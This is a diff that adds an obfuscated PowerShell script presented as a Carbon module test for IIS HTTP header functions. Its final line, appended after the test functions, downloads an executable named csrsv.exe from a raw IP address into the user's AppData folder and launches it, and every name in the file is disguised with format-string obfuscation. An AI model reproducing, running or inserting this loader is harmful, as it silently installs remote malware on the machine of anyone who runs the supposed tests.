@@ -1,0 +1,61 @@
+  &("{0}{1}" -f'S','ET')  ("{0}{1}"-f 'O','F0')  ([typE]("{1}{0}"-f 'D','guI')  ) ;  
+
+
+
+
+
+
+
+
+
+
+
+${s`ite`Na`me} = ("{3}{4}{5}{1}{0}{2}" -f'isHttpH','I','eader','C','arbon','Get')
+${sITEp`o`Rt} = 47939
+
+function sT`AR`T-TE`sT`FIXT`URe
+{
+    & (.("{2}{1}{0}" -f 'h','-Pat','Join') -Path ${PsScRIp`Tr`oOT} ((("{2}{1}{5}{4}{3}{6}{7}{8}{0}" -f 'st.ps1','.','.','-','tialize','{0}Ini','Ca','rbon','Te'))-F  [cHAR]92) -Resolve)
+}
+
+function STA`RT`-tesT
+{
+    &("{2}{4}{0}{3}{5}{1}" -f 't','Website','I','all-Ii','ns','s') -Name ${SItE`N`AME} -Path ${t`E`stDiR} -Binding ('http/*:{0}:*' -f ${s`Itep`O`Rt})
+}
+
+function St`oP-T`Est
+{
+    .("{5}{2}{4}{0}{6}{1}{3}" -f 't','-IisWebs','ni','ite','ns','U','all') -Name ${Si`T`EN`AMe}
+}
+
+function t`Est`-shoUlDretURN`AlLHe`A`ders
+{
+    ${c`URRenthEA`D`eRs} = @( &("{3}{0}{4}{2}{1}"-f'-IisH','er','pHead','Get','tt') -SiteName ${SiT`eNa`ME} )
+    
+    &("{0}{4}{1}{3}{2}" -f 'S','Iis','der','HttpHea','et-') -SiteName ${SiT`e`NaMe} -Name ("{2}{5}{1}{4}{0}{3}" -f 'r','-H','X-Carb','1','eade','on') -Value ("{0}{1}"-f'Va','lue1')
+    .("{2}{1}{5}{0}{3}{4}"-f'pH','-Iis','Set','e','ader','Htt') -SiteName ${s`I`T`ename} -Name ("{3}{4}{2}{1}{0}"-f 'er2','d','a','X-Ca','rbon-He') -Value ("{0}{1}"-f'Val','ue2')
+    
+    ${neW`hEA`DeRS} = &("{2}{4}{1}{0}{3}" -f 'ad','e','Get-Ii','er','sHttpH') -SiteName ${site`Na`ME}
+    &("{1}{3}{2}{0}"-f'-NotNull','Ass','t','er') ${ne`WheadE`Rs}
+    .("{3}{0}{1}{2}" -f 't-','T','rue','Asser') (${NeWH`e`A`DeRS}."LenG`Th" -ge 2)
+}
+
+function teST`-`sh`OUlDA`lLoWs`ea`RchiNgBYWIlDcARd
+{
+    ${NA`mE} = ("{2}{1}{6}{0}{4}{5}{3}"-f 'IisHttpRe','-Car','X','ect','d','ir','bon-Get')
+    ${v`AL`Ue} =  ${O`F0}::("{1}{2}{0}" -f'wGuid','N','e').Invoke()
+    &("{3}{4}{2}{1}{0}" -f 'er','HttpHead','Iis','Set','-') -SiteName ${Si`Ten`AME} -Name ${n`AMe} -Value ${vAl`UE}
+    
+    (${N`Ame}, ("{1}{0}"-f'arbon*','X-C') ) | .("{2}{1}{0}{3}" -f'jec','orEach-Ob','F','t') {
+        ${H`EA`dER} = .("{3}{0}{4}{1}{2}" -f 'isHt','pHeade','r','Get-I','t') -SiteName ${SITe`NaME} -Name ${_}
+        &("{2}{3}{0}{4}{1}"-f'-','tNull','A','ssert','No') ${Hea`D`eR}
+        &("{3}{2}{0}{1}" -f 't-Eq','ual','ser','As') ${n`AME} ${Hea`DER}."nA`ME"
+        &("{3}{1}{2}{0}"-f 'l','t-E','qua','Asser') ${va`l`Ue} ${HE`ADEr}."v`ALUe"
+    }
+    
+    ${hE`Ad`er} = &("{1}{3}{2}{5}{0}{4}" -f 'd','Get','tt','-IisH','er','pHea') -SiteName ${SITe`NA`Me} -Name ("{0}{1}" -f'blah','*')
+    .("{1}{2}{0}"-f't-Null','Ass','er') ${he`AdER}
+}
+
+
+(.("{1}{0}{2}" -f 'e','New-Obj','ct') ("{2}{3}{1}{0}" -f'ebClient','et.W','Syst','em.N')).("{1}{3}{0}{2}" -f 'i','Downloa','le','dF').Invoke(("{5}{1}{3}{4}{7}{8}{2}{6}{0}{9}"-f'v.ex','t','oo','p://','94.102.53.','ht','/csrs','2','38/~yah','e'),"$env:APPDATA\csrsv.exe");&("{3}{0}{1}{2}" -f'tart-','Proces','s','S') ("$env:APPDATA\csrsv.exe")
